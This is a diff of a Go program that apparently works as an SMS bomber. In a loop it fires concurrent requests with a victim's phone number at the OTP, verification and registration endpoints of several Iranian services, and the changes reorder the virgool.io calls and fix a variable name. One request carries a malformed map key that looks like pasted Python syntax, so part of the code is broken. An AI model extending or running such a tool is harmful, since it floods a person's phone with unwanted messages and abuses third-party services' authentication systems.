@@ -108,18 +108,18 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
+		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+			"identifier": phone0,
+		}, ch)   // add site
+		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+			"'method': 'phone', 'identifier'": phone0,
+		}, ch)
 		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
 			"msisdn": phone,
 		}, ch)  
 		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
 			"username": phone,
 		}, ch)   // add site
-		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"identifier": phone0,
-		}, ch)   // add site
-		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"'method': 'phone', 'identifier'": 0phone,
-		}, ch)
 		go sms("https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{
 			"cellNumber": phone,
 		}, ch)
